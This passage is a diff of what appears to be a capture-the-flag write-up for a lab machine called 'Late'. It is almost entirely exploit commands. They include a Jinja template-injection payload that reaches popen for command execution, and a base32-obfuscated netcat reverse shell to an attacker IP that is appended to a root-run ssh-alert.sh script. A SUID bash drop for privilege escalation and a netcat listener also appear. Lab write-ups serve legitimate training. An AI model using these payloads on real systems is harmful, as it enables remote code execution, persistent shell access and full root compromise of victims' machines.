@@ -86,7 +86,13 @@ stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"';echo pt
 
 ```bash
 # rev shell:
-echo "echo $(echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.16 443 >/tmp/f' | base32 -w 0) | base32 -d | bash" >> /usr/local/sbin/ssh-alert.sh ; ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1
+export _IP_=$(ip a s tun0 | grep inet | head -n1 | awk '{print $2}' | cut -d/ -f1) # you can get it like this
+
+# make sure you export the right _IP_ and _PORT_
+export _IP_=dummy
+export _PORT_=9000
+
+echo "echo $(echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc '$_IP_ $_PORT_' >/tmp/f' | base32 -w 0) | base32 -d | bash" >> /usr/local/sbin/ssh-alert.sh ; ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1
 # suid bin:
 echo -e 'cp /bin/bash /tmp/bash\nchown root:root /tmp/bash\nchmod +x /tmp/bash\nchmod u+s /tmp/bash' >> /usr/local/sbin/ssh-alert.sh;echo bla | ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1 ; /tmp/bash -p
 ```
@@ -97,14 +103,22 @@ and execute it by using ssh on the server
 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1
 ```
 
+# ocr with multiple panes
 
 ```bash
+# pane1
+mitmdump --listen-port 8800 -k -s mitm_p_script.py
+# pane2 (rev will come here)
+nc -lvnp 9000
+# pane3
 index=$(curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__() }} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html  | tr -d '\n' | sed "s|'>, <|\n|g" | sed "s|'>,<class '|\nclass |g" | grep -in popen | head -n1 | cut -d : -f 1)
-curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))'](request.args.input,shell=True,stdout=-1).communicate()[0].strip()}} ' -d 'input=echo '$(echo 'echo "echo $(echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.16 443 >/tmp/f" | base32 -w 0) | base32 -d | bash" >> /usr/local/sbin/ssh-alert.sh ; ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1' | base32 -w 0)' | base32 -d | bash' http://images.late.htb/haxhaxhax
+export _IP_=$(ip a s tun0 | grep inet | head -n1 | awk '{print $2}' | cut -d/ -f1) # you can get it like this
+export _PORT_=9000
+curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))'](request.args.input,shell=True,stdout=-1).communicate()[0].strip()}} ' -d 'input=echo '$(echo 'echo "echo $(echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc '$_IP_ $_PORT_' >/tmp/f" | base32 -w 0) | base32 -d | bash" >> /usr/local/sbin/ssh-alert.sh ; ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1' | base32 -w 0)' | base32 -d | bash' http://images.late.htb/haxhaxhax
 ```
 
 
-# ORC POC
+# OCR one script (unstable)
 
 ```bash
 kill -9 $(ps aux | grep -i mitm | awk '{print $2}'); pkill nc; ./one-click-root.py
